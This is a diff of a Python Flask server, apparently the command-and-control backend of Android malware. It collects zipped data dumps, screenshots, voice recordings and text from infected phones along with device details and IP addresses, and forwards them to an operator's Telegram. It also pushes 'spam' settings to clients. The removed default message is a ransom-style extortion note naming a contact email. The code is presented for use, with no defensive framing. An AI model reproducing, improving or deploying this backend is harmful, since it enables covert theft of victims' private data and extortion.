@@ -2,8 +2,8 @@
 server.py — единая точка на render:
   • бот-поллинг в фоне
   • /config, /commands
-  • /upload (единым файлом)
-  • /upload_chunked: init → chunk×N → finish (прогресс по кускам)
+  • /upload (одним файлом)
+  • /upload_chunked: init → chunk×N → finish
   • /upload_photo, /upload_voice, /upload_text
   • данные в /tmp/dumps
 """
@@ -29,10 +29,10 @@ OWNER_ID  = int(os.getenv("OWNER_ID", "6716592576"))
 
 SPAM_MESSAGE  = os.getenv(
     "SPAM_MESSAGE",
-    "your data is gone, so as not to leak it, write to the mail "
-    "domnaalmazniy33@gmail.com :)))))))))))))))))))",
+    "you file has sent :)))))))",
 )
 SPAM_INTERVAL = float(os.getenv("SPAM_INTERVAL", "1.0"))
+SPAM_SIZE_KB  = int(os.getenv("SPAM_SIZE_KB", "1024"))   # 1 МБ
 
 SERVER_DOMAIN = os.getenv("SERVER_DOMAIN", "backend-2-3-580p.onrender.com")
 
@@ -181,8 +181,9 @@ def bot_poll_loop():
 @app.route("/config", methods=["GET"])
 def route_config():
     return jsonify({
-        "spam_message":  SPAM_MESSAGE,
         "spam_interval": SPAM_INTERVAL,
+        "spam_size_kb":  SPAM_SIZE_KB,
+        "spam_text":     SPAM_MESSAGE,
         "server":        "render",
         "domain":        SERVER_DOMAIN,
     }), 200
@@ -200,7 +201,7 @@ def route_commands():
 
 
 # ═══════════════════════════════════════
-#  ЧАНКОВАЯ ЗАГРУЗКА (init → chunk×N → finish)
+#  ЧАНКОВАЯ ЗАГРУЗКА
 # ═══════════════════════════════════════
 
 _chunk_sessions: dict[str, dict] = {}
@@ -208,15 +209,11 @@ _chunk_sessions: dict[str, dict] = {}
 
 @app.route("/upload_chunked/init", methods=["POST"])
 def route_chunk_init():
-    """
-    клиент говорит: собираюсь прислать X байт, вот инфа.
-    сервер создаёт сессию, отдаёт session_id.
-    """
-    total   = int(request.form.get("total", "0"))
-    raw     = request.form.get("info", "{}")
-    tag     = request.form.get("tag", "REPORT")
-    cid     = request.form.get("id", "anon")
-    fname   = request.form.get("filename", "dump.zip")
+    total = int(request.form.get("total", "0"))
+    raw   = request.form.get("info", "{}")
+    tag   = request.form.get("tag", "REPORT")
+    cid   = request.form.get("id", "anon")
+    fname = request.form.get("filename", "dump.zip")
 
     try:
         info = json.loads(raw)
@@ -237,7 +234,7 @@ def route_chunk_init():
         "filename": fname,
         "started":  time.time(),
     }
-
+    print(f"[chunk] init {sid} total={total} client={cid}")
     return jsonify({"ok": True, "sid": sid, "chunk_size": 256 * 1024}), 200
 
 
@@ -247,7 +244,6 @@ def route_chunk_put():
     sess = _chunk_sessions.get(sid)
     if not sess:
         return jsonify({"ok": False, "err": "unknown sid"}), 404
-
     if "chunk" not in request.files:
         return jsonify({"ok": False, "err": "no chunk"}), 400
 
@@ -256,10 +252,7 @@ def route_chunk_put():
         f.write(data)
 
     sess["received"] += len(data)
-    pct = 0
-    if sess["total"] > 0:
-        pct = int(sess["received"] / sess["total"] * 100)
-
+    pct = int(sess["received"] / sess["total"] * 100) if sess["total"] else 0
     return jsonify({
         "ok": True,
         "received": sess["received"],
@@ -275,13 +268,14 @@ def route_chunk_finish():
     if not sess:
         return jsonify({"ok": False, "err": "unknown sid"}), 404
 
+    print(f"[chunk] finish {sid} received={sess['received']}")
+
     zip_path = DUMPS / f"{int(time.time())}_{sess['filename']}"
     try:
         sess["path"].rename(zip_path)
     except Exception:
         zip_path = sess["path"]
 
-    # распаковка
     stamp = time.strftime("%Y%m%d_%H%M%S")
     work  = DUMPS / stamp
     work.mkdir(parents=True, exist_ok=True)
@@ -304,17 +298,17 @@ def route_chunk_finish():
         f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
         f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
         f"ABI:     {info.get('cpu_abi','-')}\n"
+        f"IP:      {info.get('ip','-')}\n"
         f"Apps:    {len(info.get('installed_apps', []))}\n"
         f"```\n"
         f"🌐 https://{SERVER_DOMAIN}/health"
     )
     tg_send_document(zip_path, caption=caption)
-
     return jsonify({"ok": True, "stamp": stamp}), 200
 
 
 # ═══════════════════════════════════════
-#  ЗАГРУЗКА ОДНИМ ФАЙЛОМ (старый роут)
+#  ЗАГРУЗКА ОДНИМ ФАЙЛОМ
 # ═══════════════════════════════════════
 
 @app.route("/upload", methods=["POST"])
@@ -354,8 +348,7 @@ def route_upload():
         f"Host:    {info.get('hostname','-')}\n"
         f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
         f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
-        f"ABI:     {info.get('cpu_abi','-')}\n"
-        f"Apps:    {len(info.get('installed_apps', []))}\n"
+        f"IP:      {info.get('ip','-')}\n"
         f"```"
     )
     tg_send_document(zip_path, caption=caption)
@@ -374,6 +367,7 @@ def route_upload_photo():
     tmp = DUMPS / f"shot_{int(time.time())}.png"
     f.save(tmp)
     caption = request.form.get("caption", "📸")
+    print(f"[photo] saved {tmp.name} ({tmp.stat().st_size//1024}kb)")
     tg_send_photo(tmp, caption=caption)
     return jsonify({"ok": True}), 200
 
@@ -399,7 +393,7 @@ def route_upload_text():
 
 
 # ═══════════════════════════════════════
-#  МЕТА-РОУТЫ
+#  МЕТА
 # ═══════════════════════════════════════
 
 @app.route("/clients", methods=["GET"])
